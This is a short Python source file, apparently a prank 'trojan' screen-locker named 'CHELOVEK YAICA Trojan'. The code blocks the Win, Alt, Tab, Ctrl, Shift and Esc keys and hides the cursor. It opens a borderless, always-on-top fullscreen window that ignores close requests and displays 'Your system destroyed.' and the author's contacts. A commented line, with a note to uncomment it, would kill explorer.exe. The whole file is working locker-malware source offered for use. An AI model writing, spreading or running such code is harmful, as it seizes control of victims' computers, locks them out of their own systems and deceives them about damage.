from tkinter import *
from subprocess import Popen as cmd
import sys
import keyboard

def toggle_cursor():
    global cursor_hidden
    cursor_hidden = not cursor_hidden
    root.config(cursor="none" if cursor_hidden else "arrow")

NameFile = sys.argv[0]

root = Tk()

keyboard.block_key("win")
keyboard.block_key("alt")
keyboard.block_key("tab")
keyboard.block_key("ctrl")
keyboard.block_key("shift")
keyboard.block_key("esc")

X = root.winfo_screenwidth()
Y = root.winfo_screenheight()

##cmd("taskkill /f /in explorer.exe", shell=True) # Раскомментировать если хотите запретить доступ к комбинациям "Win+*"


bg = "black"
root["bg"] = bg
font = "Arial 25 bold"
root.config(cursor="none")
root.protocol("WM_DELETE_WINDOW", lambda arg: ...)  # То же самое что Quit только упрощенно
root.attributes("-topmost", 1)
root.geometry(f"{X}x{Y}")
root.overrideredirect(1)
Label(text="Your system destroyed.", fg="darkviolet", bg=bg, font=font).pack()
Label(text="Thank you for using CHELOVEK YAICA Trojan (EggMan Trojan). created by Xronos553.", fg="darkviolet", bg=bg, font=font).pack()
Label(text="If you see this, than your system relaxing.", fg="darkviolet", bg=bg, font=font).pack()
Label(text="\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nContacts: ", fg="darkviolet", bg=bg, font=font).pack()
Label(text="Discord: vortxronos_5553 ", fg="darkviolet", bg=bg, font=font).pack()
Label(text="Telegram: @vortxronos5553 ", fg="darkviolet", bg=bg, font=font).pack()
Label(text="GitHub: https://github.com/Gamer569809/CHELOVEK-YAICA-TROJAN-EGG-MAN-TROJAN", fg="darkviolet", bg=bg, font=font).pack()

root.mainloop()
